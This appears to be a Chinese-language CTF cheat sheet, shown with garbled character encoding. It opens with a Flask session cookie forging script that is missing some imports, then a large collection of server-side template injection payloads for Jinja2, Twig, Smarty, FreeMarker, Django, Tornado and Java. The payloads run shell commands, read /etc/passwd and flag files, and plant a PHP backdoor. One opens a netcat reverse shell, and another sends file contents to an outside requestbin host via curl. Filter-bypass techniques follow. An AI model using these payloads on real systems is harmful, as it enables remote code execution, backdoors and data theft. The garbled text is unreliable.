from itsdangerous import base64_decode
import ast

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else: # > 3.4
    from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else: # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e


if __name__ == "__main__":
    # Args are only relevant for __main__ usage
    
    ## Description for help
    parser = argparse.ArgumentParser(
                description='Flask Session Cookie Decoder/Encoder',
                epilog="Author : Wilson Sumanang, Alexandre ZANNI")

    ## prepare sub commands
    subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand')

    ## create the parser for the encode command
    parser_encode = subparsers.add_parser('encode', help='encode')
    parser_encode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=True)
    parser_encode.add_argument('-t', '--cookie-structure', metavar='<string>',
                                help='Session cookie structure', required=True)

    ## create the parser for the decode command
    parser_decode = subparsers.add_parser('decode', help='decode')
    parser_decode.add_argument('-s', '--secret-key', metavar='<string>',
                                help='Secret key', required=False)
    parser_decode.add_argument('-c', '--cookie-value', metavar='<string>',
                                help='Session cookie value', required=True)

    ## get args
    args = parser.parse_args()

    ## find the option chosen
    if(args.subcommand == 'encode'):
        if(args.secret_key is not None and args.cookie_structure is not None):
            print(FSCM.encode(args.secret_key, args.cookie_structure))
    elif(args.subcommand == 'decode'):
        if(args.secret_key is not None and args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value,args.secret_key))
        elif(args.cookie_value is not None):
            print(FSCM.decode(args.cookie_value))



```





## [3.SSTIæ¨¡æ¿æ³¨å…¥](https://www.cnblogs.com/tr1ple/p/9415641.html)

__class__ ï¼š è¿”å›å¯¹è±¡æ‰€å±çš„ç±»
__mro__ ï¼š è¿”å›ä¸€ä¸ªç±»æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„
é¡ºåºè§£æã€‚
__base__ ï¼š è¿”å›è¯¥ç±»æ‰€ç»§æ‰¿çš„åŸºç±»
// __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„
__subclasses__ ï¼š æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ª
ç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨
__init__ ï¼š ç±»çš„åˆå§‹åŒ–æ–¹æ³•
__globals__ ï¼š å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨

ç›¸å…³pyloadï¼š

```
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
```



```
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['
os'].system('ls')}}
```



```
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```



å…³äºjinja2 çš„[payload](https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020)ï¼š

```handlebars
#å‘½ä»¤æ‰§è¡Œï¼š



{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}



#æ–‡ä»¶æ“ä½œ



{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

å…¶ä¸­ç¬¬ä¸€æ¡payloadä¸­çš„[id]å¯ä»¥æ›¿æ¢æˆå‘½ä»¤,å¦‚ls,catç­‰,ç¬¬äºŒæ¡payloadçš„[filename]ä¹Ÿå¯æ›¿æ¢æˆæ–‡ä»¶åç§°.

å…³äºç»•è¿‡ï¼Œå¦‚æœç¦ç”¨äº†_globlas_

å¯ä»¥é‡‡ç”¨æ‹¼æ¥ç»•è¿‡æˆ–è€…åˆ‡ç‰‡ç»•è¿‡ï¼š

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__['__glo'+'bals__']['__builtins__']['__imp'+'ort__']('o'+'s').popen('ls').read() }}{% endif %}{% endfor %}
```



### **æœ€å…¨æ€»ç»“ï¼š**

æ‰¾åˆ°æ¨¡æ¿æ³¨å…¥ä¸»è¦ä»ä¸‰ä¸ªæ–¹å‘è¿›è¡Œæ”»å‡»

(1)æ¨¡æ¿æœ¬èº«
(2)æ¡†æ¶æœ¬èº«
(3)è¯­è¨€æœ¬èº«

**1.æ¨¡æ¿æœ¬èº«ï¼›**

**ï¼ˆ1ï¼‰Smarty**

[payload](https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020)

æ‰“å¼€æ–‡ä»¶**ï¼š**

```css
{self::getStreamVariable("file:///proc/self/loginuid")}
```

 å†™åé—¨ï¼š

```cobol
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

**ï¼ˆ2ï¼‰Twig**

payloadï¼šå…¶ä¸­idæ˜¯å‘½ä»¤ï¼›

```handlebars
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

 **ï¼ˆ3ï¼‰freeMarker**

```cobol
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

**2.åˆ©ç”¨æ¡†æ¶æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»**

 **1ï¼‰.Django**

```cobol
http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}

http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}
```



**2ï¼‰.Flask/Jinja2**

config æ˜¯Flaskæ¨¡ç‰ˆä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼Œå®ƒä»£è¡¨â€œå½“å‰é…ç½®å¯¹è±¡(flask.config)â€ï¼Œå®ƒæ˜¯ä¸€ä¸ªç±»å­—å…¸çš„å¯¹è±¡ï¼Œå®ƒåŒ…å«äº†æ‰€æœ‰åº”ç”¨ç¨‹åºçš„é…ç½®å€¼ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒåŒ…å«äº†æ¯”å¦‚æ•°æ®åº“é“¾æ¥å­—ç¬¦ä¸²ï¼Œè¿æ¥åˆ°ç¬¬ä¸‰æ–¹çš„å‡­è¯ï¼ŒSECRET_KEYç­‰æ•æ„Ÿå€¼ã€‚è™½ç„¶configæ˜¯ä¸€ä¸ªç±»å­—å…¸å¯¹è±¡ï¼Œä½†æ˜¯é€šè¿‡æŸ¥é˜…æ–‡æ¡£å¯ä»¥å‘ç° config æœ‰å¾ˆå¤šç¥å¥‡çš„æ–¹æ³•ï¼šfrom_envvar, from_object, from_pyfile, ä»¥åŠroot_pathã€‚

```handlebars
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}
//å†™æ–‡ä»¶
{{ config.from_pyfile('/tmp/evil') }}
//åŠ è½½system

{{ config['SHELL']('nc xxxx xx -e /bin/sh') }}
//æ‰§è¡Œå‘½ä»¤åå¼¹SHELL
```

**3ï¼‰.Tornado**

```cobol
http://117.78.26.79:31093/error?msg={{handler.settings}}
```

 3**.åˆ©ç”¨æ¨¡è¯­è¨€æœ¬èº«çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»**

 1ï¼‰python

[Python æ²™ç›’é€ƒé€¸å¤‡å¿˜ | K0rz3n's Blog](https://www.k0rz3n.com/2018/05/04/Python æ²™ç›’é€ƒé€¸å¤‡å¿˜/#é¢˜ç›®ä¸€ã€)

**2ï¼‰.JAVA**

**payloadï¼š**

```scss
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
```

å½“ç„¶è¦æ˜¯æ–‡ä»¶æ“ä½œå°±è¦ç”¨å¦å¤–çš„ç±»äº†,æ€è·¯æ˜¯ä¸å˜çš„

```scss
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```





### è¯»å†™æ–‡ä»¶

#### æ–¹æ³•ä¸€

##### **å¸¸ç”¨å‡½æ•°ï¼š**

å¤åˆ¶

```
__class__            ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ç±»ã€‚
__base__             ç±»å‹å¯¹è±¡çš„ç›´æ¥åŸºç±»
__bases__            ç±»å‹å¯¹è±¡çš„å…¨éƒ¨åŸºç±»ï¼Œä»¥å…ƒç»„å½¢å¼ï¼Œç±»å‹çš„å®ä¾‹é€šå¸¸æ²¡æœ‰å±æ€§ __bases__
__mro__              æ­¤å±æ€§æ˜¯ç”±ç±»ç»„æˆçš„å…ƒç»„ï¼Œåœ¨æ–¹æ³•è§£ææœŸé—´ä¼šåŸºäºå®ƒæ¥æŸ¥æ‰¾åŸºç±»ã€‚
__subclasses__()     è¿”å›è¿™ä¸ªç±»çš„å­ç±»é›†åˆï¼ŒEach class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function
__globals__          ä½¿ç”¨æ–¹å¼æ˜¯ å‡½æ•°å.__globals__è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„æ¨¡å—ã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚æŸ¥çœ‹æ‰€æœ‰é”®åï¼š__globals__.keys()ã€‚
__dic__              ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ
__getattribute__()   å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚
__getitem__()        è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a['b']ï¼Œå°±æ˜¯a.__getitem__('b')
__builtins__         å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚
__import__           åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ__import__('os').popen('ls').read()]
__str__()            è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚
url_for              flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_appã€‚
get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_appã€‚
lipsum               flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚

request              å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–openå‡½æ•°:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1   	 getä¼ å‚
request.values.x1 	 æ‰€æœ‰å‚æ•°
request.cookies      cookieså‚æ•°
request.headers      è¯·æ±‚å¤´å‚æ•°
request.form.x1   	 postä¼ å‚	(Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)
request.data  		 postä¼ å‚	(Content-Type:a/b)
request.json		 postä¼ json  (Content-Type: application/json)
config               å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}

cycler               {{cycler.__init__.__globals__.os.popen('id').read()}}
joiner               {{joiner.__init__.__globals__.os.popen('id').read()}}
namespace            {{namespace.__init__.__globals__.os.popen('id').read()}}
```

##### å¸¸ç”¨è¿‡æ»¤å™¨ï¼š

```
int()ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼›
float()ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼›
lower()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›
upper()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›
title()ï¼šæŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›
capitalize()ï¼šæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›
trim()ï¼šæˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›
wordcount()ï¼šè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›
reverse()ï¼šå­—ç¬¦ä¸²åè½¬ï¼›
replace(value,old,new)ï¼š æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›
truncate(value,length=255,killwords=False)ï¼šæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›
striptags()ï¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›
escape()æˆ–eï¼šè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†<ã€>ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent|escapeæˆ–content|eã€‚
safe()ï¼š ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š {{'<em>hello</em>'|safe}}ï¼›
list()ï¼šå°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›
string()ï¼šå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›
join()ï¼šå°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢payloadï¼›
abs()ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›
first()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›
last()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›
format(value,arags,*kwargs)ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š{{ "%s" - "%s"|format('Hello?',"Foo!") }}å°†è¾“å‡ºï¼šHelloo? - Foo!
length()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›
sum()ï¼šè¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›
sort()ï¼šè¿”å›æ’åºåçš„åˆ—è¡¨ï¼›
default(value,default_value,boolean=false)ï¼šå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼šname|default('xiaotuo')----å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean=Falseé»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean=trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨oræ¥æ›¿æ¢ã€‚
length()ï¼šè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯countã€‚
```

##### è·å–åŸºæœ¬ç±»ï¼š

```
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8] #é’ˆå¯¹jinjia2/flaskä¸º[9]é€‚ç”¨
```

##### è·å–åŸºæœ¬ç±»åï¼Œç»§ç»­å‘ä¸‹è·å–åŸºæœ¬ç±»(object)çš„å­ç±»ï¼š

```
object.__subclasses__()
```

æ‰¾åˆ°é‡è½½è¿‡çš„`__init__`ç±»ï¼ˆåœ¨è·å–åˆå§‹åŒ–å±æ€§åï¼Œå¸¦wrapperçš„è¯´æ˜æ²¡æœ‰é‡è½½ï¼Œå¯»æ‰¾ä¸å¸¦wrapperçš„ï¼‰ï¼š

```
>>> ''.__class__.__mro__[2].__subclasses__()[99].__init__
<slot wrapper '__init__' of 'object' objects>

>>> ''.__class__.__mro__[2].__subclasses__()[59].__init__
<unbound method WarningMessage.__init__>
```

##### æŸ¥çœ‹å…¶å¼•ç”¨`__builtins__`ï¼š

> **builtins**å³æ˜¯å¼•ç”¨ï¼ŒPythonç¨‹åºä¸€æ—¦å¯åŠ¨ï¼Œå®ƒå°±ä¼šåœ¨ç¨‹åºå‘˜æ‰€å†™çš„ä»£ç æ²¡æœ‰è¿è¡Œä¹‹å‰å°±å·²ç»è¢«åŠ è½½åˆ°å†…å­˜ä¸­äº†,è€Œå¯¹äº**builtins**å´ä¸ç”¨å¯¼å…¥ï¼Œå®ƒåœ¨ä»»ä½•æ¨¡å—éƒ½ç›´æ¥å¯è§ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è°ƒç”¨å¼•ç”¨çš„æ¨¡å—

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']
```

è¿™é‡Œä¼šè¿”å›dictç±»å‹ï¼Œå¯»æ‰¾keysä¸­å¯ç”¨å‡½æ•°ï¼Œç›´æ¥è°ƒç”¨å³å¯ï¼Œä½¿ç”¨keysä¸­çš„fileä»¥å®ç°è¯»å–æ–‡ä»¶çš„åŠŸèƒ½ï¼š

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()
```

#### æ–¹æ³•äºŒ

å­˜åœ¨çš„å­æ¨¡å—å¯ä»¥é€šè¿‡`.index()`æ¥è¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœå­˜åœ¨çš„è¯è¿”å›ç´¢å¼•ï¼Œç›´æ¥è°ƒç”¨å³å¯ï¼š

```
>>> ''.__class__.__mro__[2].__subclasses__().index(file)
40

[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() 
#å°†read() ä¿®æ”¹ä¸º write() å³ä¸ºå†™æ–‡ä»¶
```

### å‘½ä»¤æ‰§è¡Œ

#### åˆ©ç”¨eval è¿›è¡Œå‘½ä»¤æ‰§è¡Œ

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')
```

#### åˆ©ç”¨warnings.catch_warnings è¿›è¡Œå‘½ä»¤æ‰§è¡Œ

æŸ¥çœ‹`warnings.catch_warnings`æ–¹æ³•çš„ä½ç½®ï¼š

```
>>> [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
  59
```

æŸ¥çœ‹`linecatch`çš„ä½ç½®ï¼š

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')
  25
```

æŸ¥æ‰¾`os`æ¨¡å—çš„ä½ç½®ï¼š

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')
  12
```

æŸ¥æ‰¾`system`æ–¹æ³•çš„ä½ç½®ï¼ˆåœ¨è¿™é‡Œä½¿ç”¨`os.open().read()`å¯ä»¥å®ç°ä¸€æ ·çš„æ•ˆæœ,æ­¥éª¤ä¸€æ ·,ä¸å†å¤è¿°ï¼‰ï¼š

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')
  144
```

è°ƒç”¨`system`æ–¹æ³•ï¼š

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')
  root
```

ç›´æ¥æœç´¢ï¼š

```
>>> [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('whoami').read()
```

#### åˆ©ç”¨commands è¿›è¡Œå‘½ä»¤æ‰§è¡Œ

```
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')

{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')

{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
```

#### åˆ©ç”¨ä»»æ„å­—ç¬¦ä¸²æˆ–ç‰¹æ®Šå˜é‡

```
sss.__init__.__globals__.__builtins__.open("/flag").read()
config.__class__.__init__.__globals__['os'].popen('ls').read()
request.application.__globals__['__builtins__']['__import__']('os').popen('ls').read()
```

### ç»•è¿‡

#### **ä¸­æ‹¬å· []**

pop() å‡½æ•°ç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚

åœ¨è¿™é‡Œä½¿ç”¨popå¹¶ä¸ä¼šçœŸçš„ç§»é™¤ï¼Œä½†å´èƒ½è¿”å›å…¶å€¼ï¼Œå–ä»£ä¸­æ‹¬å·ï¼Œæ¥å®ç°ç»•è¿‡ã€‚

```
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
().__class__.__mro__.__getitem__(1).__subclasses__().pop(407)("cat /flag",shell=True,stdout=-1).communicate().__getitem__(0)
```

unicodeå­—ç¬¦ï¼š`ï¼»ï¼½`ï¼Œ`ï¹‡ï¹ˆ`

#### å¼•å· â€˜â€™**

`request.args` æ˜¯flaskä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°ï¼Œè¿™é‡ŒæŠŠ`path`å½“ä½œå˜é‡å,å°†åé¢çš„è·¯å¾„ä¼ å€¼è¿›æ¥ï¼Œè¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤ã€‚

```
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
```

unicodeå­—ç¬¦ï¼š`ï¼‚ï¼‚`ï¼Œ`ï¼‡ï¼‡`

#### **å•ä¸‹åˆ’çº¿ _**

è¿‡æ»¤äº†`_`å¯ä»¥ç”¨`dir(0)[0][0]`æˆ–è€…`request['args']`æˆ–è€… `request['values']`ç»•è¿‡ã€‚

#### **åŒä¸‹åˆ’çº¿ __**

**åŒæ ·åˆ©ç”¨`request.args`å±æ€§ã€‚**

```
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}?&class=__class__&mro=__mro__&subclasses=__subclasses__
```

æˆ–è€…`request.values`å±æ€§ã€‚

```
{{()|attr(request.values.x)|attr(request.values.y)|attr(request.values.a)()|attr(request.values.z)(185)|attr(request.values.b)|attr(request.values.c)|attr(request.values.z)(request.values.d)|attr(request.values.z)(request.values.e)(request.values.f)|attr(request.values.g)|attr(request.values.z)(request.values.h)(request.values.i)}}&x=__class__&y=__base__&z=__getitem__&a=__subclasses__&b=__init__&c=__globals__&d=__builtins__&e=__import__&f=os&g=__dict__&h=system&i=curl http://requestbin.net/r/1eqk6r61?p=`cat /flag`
```

#### **ç‚¹ .**

`''.__class__`å¯ä»¥å†™æˆ `getattr('','__class__')`æˆ–è€… `''|attr('__class__')`ã€‚

`''.eval`å¯ä»¥å†™æˆ `''|attr('__getitem__')('eval')`ã€‚

`''.__class__`å¯ä»¥å†™æˆ`''['__class__']`

#### **åŒèŠ±æ‹¬å·**

`{%if [expression]==[value]%} yes {%endif%}`

`{%print()%}`

unicodeå­—ç¬¦ï¼š`ï¸·ï¸·ï¸¸ï¸¸`

#### **åœ†æ‹¬å·**

unicodeå­—ç¬¦ï¼š`â½â¾`ï¼Œ`â‚â‚`

å¯¹å‡½æ•°æ‰§è¡Œæ–¹å¼é‡è½½ï¼Œå¦‚ `request.__class__.__getitem__=__builtins__.exec;`ï¼Œæ‰§è¡Œ`request[payload]` æ—¶ç›¸å½“äº `exec(payload)`ã€‚

lambdaè¡¨è¾¾å¼ã€‚

